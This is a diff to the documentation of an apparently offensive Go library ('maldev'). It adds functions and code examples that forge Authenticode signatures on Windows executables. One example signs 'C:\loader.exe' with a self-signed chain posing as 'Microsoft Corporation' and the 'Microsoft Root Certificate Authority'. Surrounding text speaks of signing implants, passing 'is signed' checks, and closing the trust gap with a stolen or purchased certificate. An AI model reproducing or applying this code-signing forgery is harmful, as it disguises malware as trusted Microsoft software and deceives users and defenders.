@@ -402,6 +402,45 @@ Sentinel returned by `BuildSpcIndirectDataContent` when the
 supplied `crypto.Hash` has no Authenticode OID. Use `errors.Is`
 to route on the validation failure.
 
+### `AuthenticodeContent(pePath string) ([]byte, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/pe/cert#AuthenticodeContent)
+
+One-call helper combining `parse.File.Authentihash` (SHA-256
+Authenticode hash) with `BuildSpcIndirectDataContent` — returns
+the canonical signed-content bytes for a PE. The output goes
+into the `SignedData.encapContentInfo.eContent` slot of a real
+Authenticode signature.
+
+Use this when the signing key is external (HSM / signing service /
+operator-side signtool /sign). For end-to-end pure-Go signing,
+use [`SignPE`](https://pkg.go.dev/github.com/oioio-space/maldev/pe/cert#SignPE)
+instead.
+
+### `SignPE(pePath string, opts SignOptions) (*ForgedChain, error)` + `type SignOptions struct`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/pe/cert#SignPE)
+
+Phase 2 of the path to real Authenticode. Hand-rolls a SignedData
+blob with `eContentType = OIDSpcIndirectDataContent`, the canonical
+`SpcPEImageData` (`SpcLink::file = "<<<Obsolete>>>"`), signed
+attributes (`contentType` + `messageDigest`), and a leaf-key
+RSA-SHA256 signature over the canonical SET-tagged signed-attrs
+DER. Splices the result into the PE security directory and
+recomputes the optional-header CheckSum.
+
+`signtool verify /pa /v` parses the chain successfully, prints
+the leaf + root subjects + SHA1 fingerprints, and returns
+`0x800B0109` "untrusted root" — the structural verification
+passes; only the trust-store walk fails (intended limitation:
+self-signed root). For a chain Windows trusts, the leaf must be
+issued by a real CA — out of scope for any pure-Go library.
+
+`SignOptions` mirrors [`ForgeOptions`](https://pkg.go.dev/github.com/oioio-space/maldev/pe/cert#ForgeOptions)
+(LeafSubject / IntermediateSubject / RootSubject / KeyBits /
+ValidFrom / ValidTo). The returned `*ForgedChain` lets the
+operator reuse the leaf key + chain across multiple PEs.
+
 ## Examples
 
 ### Simple — copy a Microsoft cert onto an implant
@@ -452,38 +491,54 @@ if err := cert.Write(`C:\loader.exe`, chain.Certificate); err != nil {
 // flags it. See API Reference > Forge > "What it does NOT give".
 ```
 
-### Composed — Authenticode-shaped signing input (Phase 1 building block)
+### Composed — full Authenticode signing (Phase 2)
 
 ```go
 import (
-    "crypto"
+    "crypto/x509/pkix"
 
     "github.com/oioio-space/maldev/pe/cert"
-    "github.com/oioio-space/maldev/pe/parse"
 )
 
-// Step 1: Compute the PE's canonical Authenticode hash.
-pf, err := parse.Open(`C:\loader.exe`)
+// Hand-rolled SignedData with eContentType = OIDSpcIndirectDataContent,
+// canonical SpcPEImageData with SpcLink "<<<Obsolete>>>", signed
+// attributes (contentType + messageDigest), leaf-key RSA-SHA256
+// signature over the canonical SET-tagged signed attrs DER.
+chain, err := cert.SignPE(`C:\loader.exe`, cert.SignOptions{
+    LeafSubject: pkix.Name{
+        CommonName:   "Microsoft Corporation",
+        Organization: []string{"Microsoft Corporation"},
+        Country:      []string{"US"},
+    },
+    RootSubject: pkix.Name{
+        CommonName: "Microsoft Root Certificate Authority",
+    },
+})
 if err != nil { panic(err) }
-defer pf.Close()
-hash := pf.Authentihash() // SHA-256 by default
+_ = chain // chain.Leaf, chain.LeafKey, chain.Root reusable across PEs
 
-// Step 2: Wrap the hash in the Microsoft signed-content blob.
-//         This is the byte string a real Authenticode signer
-//         signs (over the messageDigest signed attribute).
-spc, err := cert.BuildSpcIndirectDataContent(hash, crypto.SHA256)
+// signtool verify /pa /v loader.exe now extracts the chain
+// successfully — only the trust-store walk fails because the
+// root is self-signed (intended limitation: you can't pure-Go
+// produce a chain Windows trusts without a stolen / purchased
+// real CA-issued leaf).
+```
+
+### Composed — external signer pipeline (BYO key)
+
+When the signing key lives in a CSP / HSM / detached service,
+use [`AuthenticodeContent`](https://pkg.go.dev/github.com/oioio-space/maldev/pe/cert#AuthenticodeContent)
+to compute just the signing input and let the external signer
+take it from there.
+
+```go
+import "github.com/oioio-space/maldev/pe/cert"
+
+// Phase 1 helper: PE Authentihash + canonical SpcIndirectDataContent
+// in one call. Pipe to signtool /sign / osslsigncode / a remote
+// signing service.
+spc, err := cert.AuthenticodeContent(`C:\loader.exe`)
 if err != nil { panic(err) }
-
-// `spc` now holds the canonical SpcIndirectDataContent ASN.1.
-// Phase 2 (not yet shipped): hand-roll a SignedData with
-// ContentType = OIDSpcIndirectDataContent + EncapContent = spc,
-// then sign the messageDigest signed attribute with a leaf key
-// (Forge's chain.LeafKey works syntactically; signtool verify
-// fails because the chain isn't trusted).
-//
-// Today, `spc` is useful as a verifier-input fixture: feed it to
-// openssl / signtool's signing pipeline to reproduce what a
-// signing host would compute against this PE.
 _ = spc
 ```
 
@@ -690,13 +745,19 @@ cases described in OPSEC below.
   commit. The blobs themselves ARE published research artefacts
   and may be fingerprinted by threat-intel crawlers indexing the
   repo — accepted trade-off for the offline-graft convenience.
-- **`Forge` produces a chain that fails validation.** Pure-Go
-  `Forge` builds a 2- or 3-tier self-signed chain wrapped in
-  PKCS#7 SignedData — sufficient to populate the file-properties
-  Publisher field and pass "is signed" presence checks, but
-  signtool verify rejects + SmartScreen flags + trust-store walk
-  sees an unknown root. Two independent gaps separate Forge from
-  real Authenticode:
+- **`Forge` chain fails trust-store validation.** `Forge` builds
+  a 2- or 3-tier self-signed chain wrapped in PKCS#7 SignedData
+  with eContentType = OIDData. `SignPE` upgrades that to a real
+  Authenticode-shaped SignedData (eContentType =
+  OIDSpcIndirectDataContent, canonical SpcPEImageData, signed
+  attributes, leaf-key signature) — `signtool verify /v` now
+  extracts the chain and reports `0x800B0109` "untrusted root"
+  rather than the previous "no signature found". The remaining
+  gap is purely the trust-store walk: a self-signed root cannot
+  be made trusted in pure Go. Closing this gap requires a leaf
+  cert issued by a CA Windows trusts (stolen / purchased EV) —
+  out of scope for any pure-Go library. Two further historical
+  gaps from the old Forge are now closed:
    1. The signed content is not a real `SpcIndirectDataContent`
       over the PE hash. **Phase 1 of the fix shipped at v0.43.0**:
       `BuildSpcIndirectDataContent(digest, hashAlg)` produces the
